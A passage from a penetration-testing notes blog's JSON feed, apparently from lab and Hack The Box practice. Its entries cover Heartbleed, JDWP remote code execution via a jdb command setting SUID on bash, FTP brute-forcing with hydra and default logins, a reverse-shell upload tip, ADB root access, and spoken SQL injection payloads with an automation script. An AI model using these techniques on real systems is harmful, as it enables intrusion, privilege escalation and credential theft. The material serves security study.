            "content_html": "<h2 id=\"overview\">Overview</h2><p>The SSL standard includes a heartbeat option, which allows a computer at one end of an SSL connection to send a short message to verify that the other computer is still online and get a response back. Researchers found that it’s possible to send a cleverly formed, malicious heartbeat message that tricks the computer at the other end into divulging secret information. Specifically, a vulnerable computer can be tricked into transmitting the contents of the server’s memory, known as RAM.</p><p>CVE-2014-0160</p><p><img src=\"/spindel/assets/SSL%20Heartbleed/B780A93A-3E92-4ECC-AA5B-7129256A4A85.png\" alt=\"\" /></p><h2 id=\"versions-affected\">Versions Affected</h2><ul>  <li>SSL V3</li></ul><h2 id=\"public-exlploits\">Public Exlploits</h2><p><strong>you may need to run exploits multiple times to capture some output  from server memory such as scheduled processes</strong></p><ul>  <li><a href=\"https://github.com/mpgn/heartbleed-PoC\">GitHub - mpgn/heartbleed-PoC: Hearbleed exploit to retrieve sensitive information CVE-2014-0160</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.vox.com/2014/6/19/18076318/heartbleed\">The Heartbleed Bug, explained - Vox</a></li>  <li><a href=\"https://xkcd.com/1354/\">xkcd: Heartbleed Explanation</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/07/05/ssl-heartbleed",
            
            
            
            "tags": ["ssl","network"],
            
            "date_published": "2022-07-05T00:00:00+08:00",
            "date_modified": "2022-07-05T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/27/papercut-print-logger",
            "title": "Papercut Print Logger",
            "summary": "Papercut Print Logger",
            "content_text": "Overview  Print management software  Shows print logs  The idea behind Papercut is pretty neat, a user can submit a print job to a Papercut printer, and walk to any physical printer they are nearby and release the print job. Users don’t have to select from dozens of printers and hope they get the right oneReference: Death By a Thousand Papercuts – Security Ops and Researcher BlogPorts  9191/tcp  9192/tcpInteresting URL Paths# admin login to management functions) (lost the admin password?/admin# end-user login so users can review their own print activity, etc./user# central reports login/central-reports# admin login for the Web Cashier module/webcashier# admin login for release functionalityhttp://papercutserver:9191/releaseInteresting Files and Directories# contains hashed admin credentialsserver.properties# othersC:\\Program Files\\PaperCut Print Logger\\papercut-logger.confReferences  HTB Fuse  Security vulnerability information and common security questions - PaperCut  Monitor with PaperCut print logger everything that comes out of the printer on your computer",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>Print management software</li>  <li>Shows print logs</li></ul><p><img src=\"/spindel/assets/Papercut%20Print%20Logger/A4FC4428-8700-4923-A0BC-61A5EED2AA15.png\" alt=\"\" /></p><blockquote>  <p>The idea behind Papercut is pretty neat, a user can submit a print job to a Papercut printer, and walk to any physical printer they are nearby and release the print job. Users don’t have to select from dozens of printers and hope they get the right one</p></blockquote><p>Reference: <a href=\"https://redblue42.code42.com/death-by-a-thousand-papercuts/\">Death By a Thousand Papercuts – Security Ops and Researcher Blog</a></p><h2 id=\"ports\">Ports</h2><ul>  <li>9191/tcp</li>  <li>9192/tcp</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># admin login to management functions) (lost the admin password?</span><span class=\"w\"></span><span class=\"n\">/admin</span><span class=\"w\"></span><span class=\"c\"># end-user login so users can review their own print activity, etc.</span><span class=\"w\"></span><span class=\"n\">/user</span><span class=\"w\"></span><span class=\"c\"># central reports login</span><span class=\"w\"></span><span class=\"n\">/central-reports</span><span class=\"w\"></span><span class=\"c\"># admin login for the Web Cashier module</span><span class=\"w\"></span><span class=\"n\">/webcashier</span><span class=\"w\"></span><span class=\"c\"># admin login for release functionality</span><span class=\"w\"></span><span class=\"n\">http://papercutserver:9191/release</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># contains hashed admin credentials</span><span class=\"w\"></span><span class=\"n\">server.properties</span><span class=\"w\"></span><span class=\"c\"># others</span><span class=\"w\"></span><span class=\"n\">C:\\Program</span><span class=\"w\"> </span><span class=\"nx\">Files\\PaperCut</span><span class=\"w\"> </span><span class=\"nx\">Print</span><span class=\"w\"> </span><span class=\"nx\">Logger\\papercut-logger.conf</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Fuse</li>  <li><a href=\"https://www.papercut.com/kb/Main/CommonSecurityQuestions#general-security-questions\">Security vulnerability information and common security questions - PaperCut</a></li>  <li><a href=\"https://www.youtube.com/watch?v=fpKfILnsdM0\">Monitor with PaperCut print logger everything that comes out of the printer on your computer</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/27/papercut-print-logger",
            
            
            
            "tags": ["enum","printers","windows"],
            
            "date_published": "2022-06-27T00:00:00+08:00",
            "date_modified": "2022-06-27T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/26/java-debug-wire-protocol-jdwp",
            "title": "Java Debug Wire Protocol (JDWP)",
            "summary": "Java Debug Wire Protocol (JDWP)",
            "content_text": "StartupThis is included on tomcat startup parameters. Example./usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties [...redacted...]-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n [...redacted...]Attacks  Privesc RCE if tomcat is running as root - this finds the java.lang.Runtime.getRuntime() to invoke exec() passing a string objectManual Exploitation of RCEjdb -attach 127.0.0.1:8000&gt; stop in javax.GenericServlet.init()&gt; Set deferred breakpoint javax.servlet.GenericServlet.init()main[1] eval new java.lang.Runtime().exec(\"chmod +s /bin/bash\")Tips  If exploit is not working, ensure that tomcat is hitting a breakpoint. For example restart tomcat.References  Hacktricks - Pentesting JDWP",
            "content_html": "<h2 id=\"startup\">Startup</h2><p>This is included on tomcat startup parameters. Example.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>/usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties [...redacted...]-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n [...redacted...]</code></pre></div></div><h2 id=\"attacks\">Attacks</h2><ul>  <li>Privesc RCE if tomcat is running as root - this finds the <code class=\"language-plaintext highlighter-rouge\">java.lang.Runtime.getRuntime()</code> to invoke <code class=\"language-plaintext highlighter-rouge\">exec()</code> passing a string object</li></ul><h2 id=\"manual-exploitation-of-rce\">Manual Exploitation of RCE</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jdb <span class=\"nt\">-attach</span> 127.0.0.1:8000<span class=\"o\">&gt;</span> stop <span class=\"k\">in </span>javax.GenericServlet.init<span class=\"o\">()</span><span class=\"o\">&gt;</span> Set deferred breakpoint javax.servlet.GenericServlet.init<span class=\"o\">()</span>main[1] <span class=\"nb\">eval </span>new java.lang.Runtime<span class=\"o\">()</span>.exec<span class=\"o\">(</span><span class=\"s2\">\"chmod +s /bin/bash\"</span><span class=\"o\">)</span></code></pre></div></div><h2 id=\"tips\">Tips</h2><ul>  <li>If exploit is not working, ensure that tomcat is hitting a breakpoint. For example restart tomcat.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-jdwp-java-debug-wire-protocol\">Hacktricks - Pentesting JDWP</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/26/java-debug-wire-protocol-jdwp",
            
            
            
            "tags": ["java","enum"],
            
            "date_published": "2022-06-26T00:00:00+08:00",
            "date_modified": "2022-06-26T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/13/ftp",
            "title": "FTP",
            "summary": "FTP",
            "content_text": "Initial# kickoff nmap nse ftp scriptsnmap -p21 --script ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum 10.10.10.130# or just simply\tFTP Commands# Make sure you include hidden files and directoriesls -laInteresting Files and Directories# Contains list of disallowed users/etc/ftpusers# FTP Root location in Windowsc:\\inetpub\\ftprootUsername enumeration# https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl~/data/tools/ftp-user-enum.pl -U users.txt -t 172.16.177.4Credentials  Try some anonymous logins# manual authenticationanonymous / anonymousanonymous /ftp / ftpftpuser / ftpuser# via nmapnmap -p21 --script ftp-anon 10.10.51.236  Try bruteforce# user and pass list can be extracted from# /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txtcat /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | cut -d':' -f1 &gt; users.txtcat /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | cut -d':' -f2 &gt; passwords.txthydra -V -f -L users.txt -P passwords.txt ftp://10.10.10.46 -u -vV# try also nmapnmap -p21 10.10.10.46 --script ftp-bruteDownloading files# Make sure turn on binary mode on files such as# executablesftp&gt; binary200 Type set to I.ftp&gt; mget *mget chatserver.exe? y# using wgetwget -m --no-passive ftp://anonymous:anonymous@access.htb# Recursive - sometimes this hangs, so just retry againwget -r ftp://user:pass@server.comwget -r --no-passive ftp://user:pass@server.com/wget -r ftp://user:pass@server.com/etcUploading files  When a web server resources are hosted also on FTP, try to upload a reverse shell and access that reverse shell on the websiteFinding Exploits# via expoitdbsearchsploit vsftpdTroubleshooting  This error appeared in HTB Carrier. Type passive to resolve it.Connected to 10.120.15.10.220 (vsFTPd 3.0.3)Name (10.120.15.10:root): 331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir500 Illegal PORT command.ftp: bind: Address already in useftp&gt;Other resources  21 - Pentesting FTP - HackTricks",
            "content_html": "<h2 id=\"initial\">Initial</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># kickoff nmap nse ftp scripts</span>nmap <span class=\"nt\">-p21</span> <span class=\"nt\">--script</span> ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum 10.10.10.130<span class=\"c\"># or just simply</span>\t</code></pre></div></div><h2 id=\"ftp-commands\">FTP Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Make sure you include hidden files and directories</span><span class=\"nb\">ls</span> <span class=\"nt\">-la</span></code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Contains list of disallowed users</span>/etc/ftpusers<span class=\"c\"># FTP Root location in Windows</span>c:<span class=\"se\">\\i</span>netpub<span class=\"se\">\\f</span>tproot</code></pre></div></div><h2 id=\"username-enumeration\">Username enumeration</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl</span>~/data/tools/ftp-user-enum.pl <span class=\"nt\">-U</span> users.txt <span class=\"nt\">-t</span> 172.16.177.4</code></pre></div></div><h2 id=\"credentials\">Credentials</h2><ul>  <li>Try some anonymous logins</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># manual authentication</span>anonymous / anonymousanonymous /ftp / ftpftpuser / ftpuser<span class=\"c\"># via nmap</span>nmap <span class=\"nt\">-p21</span> <span class=\"nt\">--script</span> ftp-anon 10.10.51.236</code></pre></div></div><ul>  <li>Try bruteforce</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># user and pass list can be extracted from</span><span class=\"c\"># /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt</span><span class=\"nb\">cat</span> /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">':'</span> <span class=\"nt\">-f1</span> <span class=\"o\">&gt;</span> users.txt<span class=\"nb\">cat</span> /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">':'</span> <span class=\"nt\">-f2</span> <span class=\"o\">&gt;</span> passwords.txthydra <span class=\"nt\">-V</span> <span class=\"nt\">-f</span> <span class=\"nt\">-L</span> users.txt <span class=\"nt\">-P</span> passwords.txt ftp://10.10.10.46 <span class=\"nt\">-u</span> <span class=\"nt\">-vV</span><span class=\"c\"># try also nmap</span>nmap <span class=\"nt\">-p21</span> 10.10.10.46 <span class=\"nt\">--script</span> ftp-brute</code></pre></div></div><h2 id=\"downloading-files\">Downloading files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Make sure turn on binary mode on files such as</span><span class=\"c\"># executables</span>ftp&gt; binary200 Type <span class=\"nb\">set </span>to I.ftp&gt; mget <span class=\"k\">*</span>mget chatserver.exe? y<span class=\"c\"># using wget</span>wget <span class=\"nt\">-m</span> <span class=\"nt\">--no-passive</span> ftp://anonymous:anonymous@access.htb<span class=\"c\"># Recursive - sometimes this hangs, so just retry again</span>wget <span class=\"nt\">-r</span> ftp://user:pass@server.comwget <span class=\"nt\">-r</span> <span class=\"nt\">--no-passive</span> ftp://user:pass@server.com/wget <span class=\"nt\">-r</span> ftp://user:pass@server.com/etc</code></pre></div></div><h2 id=\"uploading-files\">Uploading files</h2><ul>  <li>When a web server resources are hosted also on FTP, try to upload a reverse shell and access that reverse shell on the website</li></ul><h2 id=\"finding-exploits\">Finding Exploits</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># via expoitdb</span>searchsploit vsftpd</code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><ul>  <li>This error appeared in HTB Carrier. Type <code class=\"language-plaintext highlighter-rouge\">passive</code> to resolve it.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Connected to 10.120.15.10.220 (vsFTPd 3.0.3)Name (10.120.15.10:root): 331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir500 Illegal PORT command.ftp: bind: Address already in useftp&gt;</code></pre></div></div><h2 id=\"other-resources\">Other resources</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-ftp\">21 - Pentesting FTP - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/13/ftp",
            
            
            
            "tags": ["ftp","enum"],
            
            "date_published": "2022-06-13T00:00:00+08:00",
            "date_modified": "2022-06-13T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/12/xss-and-deserialization-chain-attack",
            "title": "XSS and Deserialization Chain Attack",
            "summary": "XSS and Deserialization Chain Attack",
            "content_text": "OverviewThis attack was from HTB Cereal which performs a deserializaton attack. In order to execute the deserialization payload, an XSS payload must be triggered to bypass the IP restriction.This attack also makes use of a forged JWT token.The method here came from 0xdf writeup.",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>This attack was from HTB Cereal which performs a deserializaton attack. In order to execute the deserialization payload, an XSS payload must be triggered to bypass the IP restriction.</p><p>This attack also makes use of a forged JWT token.</p><p><img src=\"/spindel/assets/XSS%20and%20Deserialization%20Chain%20Attack/628EB962-448D-40D8-B32F-537C8811796D.png\" alt=\"\" /></p><p>The method here came from 0xdf <a href=\"https://0xdf.gitlab.io/2021/05/29/htb-cereal.html\">writeup</a>.</p>",
            "url": "https://mvineza.github.io/spindel/2022/06/12/xss-and-deserialization-chain-attack",
            
            
            
            "tags": ["xss","deserial","dotnet","jwt","windows"],
            
            "date_published": "2022-06-12T00:00:00+08:00",
            "date_modified": "2022-06-12T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/11/access-adb-as-root",
            "title": "Access ADB as root",
            "summary": "Access ADB as root",
            "content_text": "  Do local port forwarding so you can access abd shell on localhostssh kristi@htb -p 2222 -L 5555:localhost:5555  Connect to adb shelladb connect localhost:5555  Verify➜  explore adb devices               List of devices attachedhtb:2222\tofflinelocalhost:5555\tdevice  Enjoyadb -s localhost shell127|x86_64:/ $ whoamishellx86_64:/ $ su:/ # cat data/root.txtf04fc82b6d49b41c9b08982be59338c5:/ #",
            "content_html": "<ul>  <li>Do local port forwarding so you can access abd shell on localhost</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>ssh kristi@htb <span class=\"nt\">-p</span> 2222 <span class=\"nt\">-L</span> 5555:localhost:5555</code></pre></div></div><ul>  <li>Connect to adb shell</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>adb connect localhost:5555</code></pre></div></div><ul>  <li>Verify</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  explore adb devices               List of devices attachedhtb:2222\tofflinelocalhost:5555\tdevice</code></pre></div></div><ul>  <li>Enjoy</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>adb -s localhost shell127|x86_64:/ $ whoamishellx86_64:/ $ su:/ # cat data/root.txtf04fc82b6d49b41c9b08982be59338c5:/ #</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/06/11/access-adb-as-root",
            
            
            
            "tags": ["android","privesc","mobile"],
            
            "date_published": "2022-06-11T00:00:00+08:00",
            "date_modified": "2022-06-11T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/08/ai",
            "title": "AI",
            "summary": "AI",
            "content_text": "Sample PHP Pseudo Code$voice = new play('file.wav');$result = $voice-&gt;recognise(\"Good Morning\");if ($result) {   echo \"Matched Good Morning\";   //flag to database or csv } else {   echo \"No match found\"; }Attacks                              [Text-To-Speech speaks pwned          Flanker Sky](https://blog.flanker017.me/text-to-speech-speaks-pwned/)                      Alexa Can Be Hacked with SQL Injection to Give Away Private Info - IoT Tech TrendsTools                              [Text to speech free online          Text to mp3, Text to wav](https://www.texttospeechfree.com/)                      Text 2 Speech - Includes more voices such as Male US, I used this in HTB Ai  Flite - Command line equivalent of Text 2 Speech# Generates WAV file from Male US voiceflite -voice rms \"hello world\" a.wav  text2wav - similar to fliteecho \"Hello open single quote\" | text2wave -o ai.wavVoice to SQL  GitHub - Shravankumarhiregoudar/Speech-to-SQL-Research-Paper                              [Just Speak SQL          ADA Lab Blog](https://adalabucsd.github.io/research-blog/research/2020/06/14/speakql.html)                    Speech to SQL Queries and Payloads  From HTB AI:  Windows Speech Recognition commands  Some custom payloads from HTB AI (See python script below for reference):# I didn't see any speech to text command for \"select\" in# microsoft website but this works in this form.# Result:#  &lt;h3&gt;Our understanding of your input is : 'union select 1 -- -&lt;br /&gt;Query result : 1&lt;h3&gt;./sqli.py \"open single quote union select 1 comment database\"# Here, \"select\" and \"password\" was combined to \"selectpassword\"# Result: H,Sq9t6}a&lt;)?q93_./sqli.py \"open single quote union selectpassword from users comment database\"# Adding \"space\" to get username# Result: &lt;h3&gt;Our understanding of your input is : 'union select   username from users -- -&lt;br /&gt;Query result : alexa&lt;h3&gt;./sqli.py \"open single quote union select space username from users comment database\"  From HTB AI official walkthrough' union select password from users#Python script to automate upload of WAV File#!/usr/bin/env python3import requestsimport osimport sysimport reproxies = {'http': 'http://127.0.0.1:8080'}url = 'http://ai/ai.php'wav_filename = 'voice.wav'voice_filename = 'voice.txt'try:  query = sys.argv[1]except IndexError:  print('Example Usage: ./sqli.py \"Comment database\"')  sys.exit(0)def generate_wav(query):  with open(voice_filename, 'w') as f:    f.write(query)  os.system('flite -voice rms {} {}'.format(voice_filename, wav_filename))def send_file():  data = {'wav_filename': wav_filename, 'name': 'Submit'}  files = {    'fileToUpload': (wav_filename, open(wav_filename, 'rb')),    'submit': (None, 'Process It!')    }  r = requests.post(url, files=files, proxies=proxies)  sql_response = re.findall('&lt;h3&gt;Our understanding.+&lt;h3&gt;', r.text)[0]  print(sql_response)generate_wav(query)send_file()References  BRA.I.NSMASHER Presentation - HackTricks",
            "content_html": "<h2 id=\"sample-php-pseudo-code\">Sample PHP Pseudo Code</h2><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$voice</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">play</span><span class=\"p\">(</span><span class=\"s1\">'file.wav'</span><span class=\"p\">);</span><span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nv\">$voice</span><span class=\"o\">-&gt;</span><span class=\"nf\">recognise</span><span class=\"p\">(</span><span class=\"s2\">\"Good Morning\"</span><span class=\"p\">);</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$result</span><span class=\"p\">)</span> <span class=\"p\">{</span>   <span class=\"k\">echo</span> <span class=\"s2\">\"Matched Good Morning\"</span><span class=\"p\">;</span>   <span class=\"c1\">//flag to database or csv</span> <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>   <span class=\"k\">echo</span> <span class=\"s2\">\"No match found\"</span><span class=\"p\">;</span> <span class=\"p\">}</span></code></pre></div></div><h2 id=\"attacks\">Attacks</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[Text-To-Speech speaks pwned</td>          <td>Flanker Sky](https://blog.flanker017.me/text-to-speech-speaks-pwned/)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.iottechtrends.com/alexa-hacked-sql-injection/\">Alexa Can Be Hacked with SQL Injection to Give Away Private Info - IoT Tech Trends</a></li></ul><h2 id=\"tools\">Tools</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[Text to speech free online</td>          <td>Text to mp3, Text to wav](https://www.texttospeechfree.com/)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.text2speech.org/\">Text 2 Speech</a> - Includes more voices such as Male US, I used this in HTB Ai</li>  <li><a href=\"https://github.com/festvox/flite\">Flite</a> - Command line equivalent of <a href=\"https://www.text2speech.org/\">Text 2 Speech</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Generates WAV file from Male US voice</span>flite <span class=\"nt\">-voice</span> rms <span class=\"s2\">\"hello world\"</span> a.wav</code></pre></div></div><ul>  <li><a href=\"http://manpages.ubuntu.com/manpages/bionic/man1/text2wave.1.html\">text2wav</a> - similar to flite</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s2\">\"Hello open single quote\"</span> | text2wave <span class=\"nt\">-o</span> ai.wav</code></pre></div></div><h2 id=\"voice-to-sql\">Voice to SQL</h2><ul>  <li><a href=\"https://github.com/Shravankumarhiregoudar/Speech-to-SQL-Research-Paper#:~:text=Speech%20to%20SQL%20query%20generator,connecting%20to%20the%20backend%20database.\">GitHub - Shravankumarhiregoudar/Speech-to-SQL-Research-Paper</a></li>  <li>    <table>      <tbody>        <tr>          <td>[Just Speak SQL</td>          <td>ADA Lab Blog](https://adalabucsd.github.io/research-blog/research/2020/06/14/speakql.html)</td>        </tr>      </tbody>    </table>  </li></ul><h2 id=\"speech-to-sql-queries-and-payloads\">Speech to SQL Queries and Payloads</h2><ul>  <li>From HTB AI:</li></ul><p><img src=\"/spindel/assets/AI/DB424957-B1BF-4C2B-8C56-EFE656773724.png\" alt=\"\" /></p><ul>  <li><a href=\"https://support.microsoft.com/en-us/windows/windows-speech-recognition-commands-9d25ef36-994d-f367-a81a-a326160128c7\">Windows Speech Recognition commands</a></li>  <li>Some custom payloads from HTB AI (See python script below for reference):</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># I didn't see any speech to text command for \"select\" in</span><span class=\"c\"># microsoft website but this works in this form.</span><span class=\"c\"># Result:</span><span class=\"c\">#  &lt;h3&gt;Our understanding of your input is : 'union select 1 -- -&lt;br /&gt;Query result : 1&lt;h3&gt;</span>./sqli.py <span class=\"s2\">\"open single quote union select 1 comment database\"</span><span class=\"c\"># Here, \"select\" and \"password\" was combined to \"selectpassword\"</span><span class=\"c\"># Result: H,Sq9t6}a&lt;)?q93_</span>./sqli.py <span class=\"s2\">\"open single quote union selectpassword from users comment database\"</span><span class=\"c\"># Adding \"space\" to get username</span><span class=\"c\"># Result: &lt;h3&gt;Our understanding of your input is : 'union select   username from users -- -&lt;br /&gt;Query result : alexa&lt;h3&gt;</span>./sqli.py <span class=\"s2\">\"open single quote union select space username from users comment database\"</span></code></pre></div></div><ul>  <li>From HTB AI official walkthrough</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"s1\">' union select password from users#</span></code></pre></div></div><h2 id=\"python-script-to-automate-upload-of-wav-file\">Python script to automate upload of WAV File</h2><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">requests</span><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"kn\">import</span> <span class=\"nn\">sys</span><span class=\"kn\">import</span> <span class=\"nn\">re</span><span class=\"n\">proxies</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">'http'</span><span class=\"p\">:</span> <span class=\"s\">'http://127.0.0.1:8080'</span><span class=\"p\">}</span><span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"s\">'http://ai/ai.php'</span><span class=\"n\">wav_filename</span> <span class=\"o\">=</span> <span class=\"s\">'voice.wav'</span><span class=\"n\">voice_filename</span> <span class=\"o\">=</span> <span class=\"s\">'voice.txt'</span><span class=\"k\">try</span><span class=\"p\">:</span>  <span class=\"n\">query</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"k\">except</span> <span class=\"nb\">IndexError</span><span class=\"p\">:</span>  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'Example Usage: ./sqli.py \"Comment database\"'</span><span class=\"p\">)</span>  <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"nb\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span><span class=\"k\">def</span> <span class=\"nf\">generate_wav</span><span class=\"p\">(</span><span class=\"n\">query</span><span class=\"p\">):</span>  <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">voice_filename</span><span class=\"p\">,</span> <span class=\"s\">'w'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">f</span><span class=\"p\">:</span>    <span class=\"n\">f</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">query</span><span class=\"p\">)</span>  <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">system</span><span class=\"p\">(</span><span class=\"s\">'flite -voice rms {} {}'</span><span class=\"p\">.</span><span class=\"nb\">format</span><span class=\"p\">(</span><span class=\"n\">voice_filename</span><span class=\"p\">,</span> <span class=\"n\">wav_filename</span><span class=\"p\">))</span><span class=\"k\">def</span> <span class=\"nf\">send_file</span><span class=\"p\">():</span>  <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">'wav_filename'</span><span class=\"p\">:</span> <span class=\"n\">wav_filename</span><span class=\"p\">,</span> <span class=\"s\">'name'</span><span class=\"p\">:</span> <span class=\"s\">'Submit'</span><span class=\"p\">}</span>  <span class=\"n\">files</span> <span class=\"o\">=</span> <span class=\"p\">{</span>    <span class=\"s\">'fileToUpload'</span><span class=\"p\">:</span> <span class=\"p\">(</span><span class=\"n\">wav_filename</span><span class=\"p\">,</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">wav_filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)),</span>    <span class=\"s\">'submit'</span><span class=\"p\">:</span> <span class=\"p\">(</span><span class=\"bp\">None</span><span class=\"p\">,</span> <span class=\"s\">'Process It!'</span><span class=\"p\">)</span>    <span class=\"p\">}</span>  <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"n\">post</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">,</span> <span class=\"n\">files</span><span class=\"o\">=</span><span class=\"n\">files</span><span class=\"p\">,</span> <span class=\"n\">proxies</span><span class=\"o\">=</span><span class=\"n\">proxies</span><span class=\"p\">)</span>  <span class=\"n\">sql_response</span> <span class=\"o\">=</span> <span class=\"n\">re</span><span class=\"p\">.</span><span class=\"n\">findall</span><span class=\"p\">(</span><span class=\"s\">'&lt;h3&gt;Our understanding.+&lt;h3&gt;'</span><span class=\"p\">,</span> <span class=\"n\">r</span><span 